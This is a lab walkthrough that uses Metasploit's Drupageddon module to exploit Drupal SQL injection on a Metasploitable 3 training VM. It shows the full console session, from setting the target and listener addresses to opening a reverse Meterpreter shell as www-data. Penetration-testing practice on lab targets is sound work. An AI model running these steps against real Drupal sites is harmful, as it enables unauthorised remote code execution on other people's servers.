---
title: Drupal HTTP Parameter Key/Value SQL Injection
description: Drupal HTTP Parameter Key/Value SQL Injection
date: 2023-02-15 00:00:00+0000
categories:
    - Metasploitable3 Linux Edition
    - Parrot OS
tags:
    - metasploit
    - Metasploitable3 Linux Edition
weight: 1   
toc: false
---
## Target: Metasploitable 3 Linux

## Tool: Metasploit

## Vulnerability: Drupal HTTP Parameter Key/Value SQL Injection

"This module exploits the Drupal HTTP Parameter Key/Value SQL Injection (aka Drupageddon) in order to achieve a remote shell on the vulnerable instance. This module was tested against Drupal 7.0 and 7.31 (was fixed in 7.32). Two methods are available to trigger the PHP payload on the target: - set TARGET 0: Form-cache PHP injection method (default). This uses the SQLi to upload a malicious form to Drupal's cache, then trigger the cache entry to execute the payload using a POP chain. - set TARGET 1: User-post injection method. This creates a new Drupal user, adds it to the administrators group, enable Drupal's PHP module, grant the administrators the right to bundle PHP code in their post, create a new post containing the payload and preview it to trigger the payload execution."

<https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/>

```shell
[msf](Jobs:0 Agents:0) >> use exploit/multi/http/drupal_drupageddon
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Drupal 7.0 - 7.31 (form-cache PHP injection method)
    1   Drupal 7.0 - 7.31 (user-post PHP injection method)


[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set TARGET 0
TARGET => 0
[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> show options

Module options (exploit/multi/http/drupal_drupageddon):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/
                                         basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The target URI of the Drupal installation
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Drupal 7.0 - 7.31 (form-cache PHP injection method)



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set RHOST 10.0.2.28
RHOST => 10.0.2.28
[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set LHOST 10.0.2.16
LHOST => 10.0.2.16
[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set TARGETURI /drupal/
TARGETURI => /drupal/
[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> exploit

[*] Started reverse TCP handler on 10.0.2.16:4444 
[*] Sending stage (39927 bytes) to 10.0.2.28
[*] Meterpreter session 1 opened (10.0.2.16:4444 -> 10.0.2.28:44842) at 2024-02-20 10:03:59 +0000

(Meterpreter 1)(/var/www/html/drupal) > getuid
Server username: www-data
(Meterpreter 1)(/var/www/html/drupal) > pwd
/var/www/html/drupal
(Meterpreter 1)(/var/www/html/drupal) > 
```
